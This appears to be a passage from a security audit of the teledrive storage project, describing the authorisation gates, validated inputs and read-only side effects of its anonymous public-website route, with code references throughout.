- **Auth model:** none. Anonymous, credential-free, on the **app origin**. Three independent conditions are all required at request time: (1) a stored website config exists and `enabled` is true (`web/app.py:6057`, `6062`), (2) `storage_buckets.public_read` is true (`web/app.py:6058`, `6062`; the column defaults FALSE, `teledrive/storage/schema.py:385`), (3) the resolved key is a **current ready head** (`BucketCatalog.get` → `storage_object_heads`, `teledrive/storage/catalog.py:551-562`; `ManifestStore.get` requires `status == "ready"`, `teledrive/storage/manifest.py:512-517`). Neither flag alone publishes anything: `public_read` is read *only* by this route (no other use in `web/s3.py`, `teledrive/` or the engine), and `PutBucketWebsite` passes `public_read=None` so it never flips the gate (`teledrive/s3/website.py:181-201`). The gate is writable only by `role == "admin"` sessions (`web/app.py:3950-3951`; API keys carry role `"api-key"`, `web/app.py:625`, and are refused), or by the governance router which requires `admin` + same-origin + the `PUBLISH` token (`web/s3_governance_api.py:99-120`, `857-876`). `DeleteBucketWebsite` (`web/s3.py:1476-1480`) and bucket deletion (`teledrive/storage/catalog.py:1447`) clear `public_read` in the same transaction, so a stray open gate is not reachable through any API.
- **Inputs:** path only — `bucket` (validated by `BucketCatalog.validate_bucket`, `teledrive/storage/catalog.py:144-149`, before any DB access) and `path` (Starlette-decoded, then decoded up to 3 more times by `_site_path`, `web/app.py:5982-6012`). The query string is ignored entirely (no `versionId`, no `Range`, no conditional headers). The method is read only for the intended `HEAD` short-circuit (`web/app.py:6090`). Config-supplied names: `index_document` is the directory default (`web/app.py:6067-6070`) and `error_document` is the 404 body (`web/app.py:6079-6084`); both are validated on every write path (`teledrive/s3/website.py:47-78`: ≤255 UTF-8 bytes, no `.`/`..`/empty segments, no leading `/` or `~`, no `\ ? # %`, no control chars, no trailing `/`).
- **Side effects:** reads only. Reads `storage_website_configs`, `storage_buckets`, `storage_object_heads`, manifest/chunk tables and object metadata, then streams Telegram chunks via `TelegramObjectStorage.iter_bytes` (`web/app.py:6105`). No access accounting (`record_object_access` is not called, unlike the REST path), no notification, no journal entry. One DB connection is held for the whole stream and closed in `finally` (`web/app.py:6103-6108`) or in `except BaseException` on the pre-stream path (`web/app.py:6099-6101`).
